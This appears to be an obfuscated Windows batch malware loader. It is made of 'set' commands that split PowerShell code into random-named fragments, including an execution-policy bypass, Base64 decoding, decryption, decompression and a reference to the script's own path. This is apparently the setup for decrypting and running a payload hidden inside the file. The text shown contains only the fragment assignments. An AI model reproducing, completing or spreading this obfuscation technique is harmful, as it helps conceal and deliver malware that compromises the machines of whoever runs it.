@echo off
set "WUXUXndbhH=();$"
set "pAgrFJoLqx=;$aT"
set "lICBWHgAPO=ing("
set "QuSIWQufQo=w) {"
set "wBYSIliqBi=)))"
set "iSEUeKqHTu=Stre"
set "lIiEinOMfI=esaB"
set "cMJhUmlJII=.Dis"
set "etRQtptKrt=ecry"
set "AlFQHxtkbD=XcHm"
set "aoQRLkYkeL=vAbT"
set "SfQkHPtYxC=('%~f0'"
set "IYsbkGJkhB=rans"
set "mlqUrHmPDP==');"
set "vjiiXaqpJv=Vm ="
set "ZAQawNwpaB=iron"
set "LSCzdkOHsH=swXw"
set "VeqzdYkvcU=.-16"
set "KByaEwmGYs=-ep "
set "BQvAofqrtv=y.Pa"
set "NyvEFgTOjP=k; }"
set "Njyqbnkdtx=Hm ="
set "VNGnqIagMN=form"
set "YziHrBaSht=);$l"
set "ugTfjOQdft= '')"
set "dqNvbdalyW=ojgT"
set "IDFopQOaDs=Vm);"
set "vTxZmFhyYE=comm"
set "YWbnIsqXvs=[Env"
set "HtVJFTrWOR=; };"
set "uHRkmOxYnE=ateD"
set "LjBukDhZsQ=UdVm"
set "bLnUXDhbQu=Comp"
set "kqqTHWznpz=[-1."
set "FxDVvFbfsQ=-1.."
set "CtNFizhhgc=..-1"
set "iLPiYwgMWg= New"
set "rOusOjXZHC=$wUd"
set "TXsSkZDRTw=('%*'"
set "mGWNnWTehU=ress"
set "mrZyoXQKvB=orF'"
set "xPTqiLvgsd=V = "
